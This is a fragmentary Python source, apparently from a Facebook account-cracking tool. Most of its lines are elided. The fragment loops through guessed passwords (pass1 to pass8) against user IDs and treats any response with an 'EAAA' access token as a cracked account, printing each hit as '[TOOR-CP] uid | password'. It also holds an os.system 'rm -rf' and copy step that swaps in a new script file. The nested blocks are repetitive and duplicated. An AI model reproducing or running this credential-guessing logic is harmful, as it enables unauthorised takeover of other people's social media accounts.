...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("rm -rf nazir007.py")

			os.system("cp -f nazir/nazir007.py \\.")

			os.system("rm -rf nazir007")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				print(" \033[1;32m[TOOR-CP] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[TOOR-CP] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[TOOR-CP] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[TOOR-CP] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[TOOR-CP] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[TOOR-CP] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[TOOR-CP] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[TOOR-CP] "+uid+" | "+pass8+"\033[0;97m")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				print(" \033[1;32m[TOR--CP] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[TOR-CP] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[TOR-CP] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[TOR-CP] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[TOR-CP] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[TOR-CP] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[TOR-CP] "+uid+" | "+pass7+"\033[0;97m")
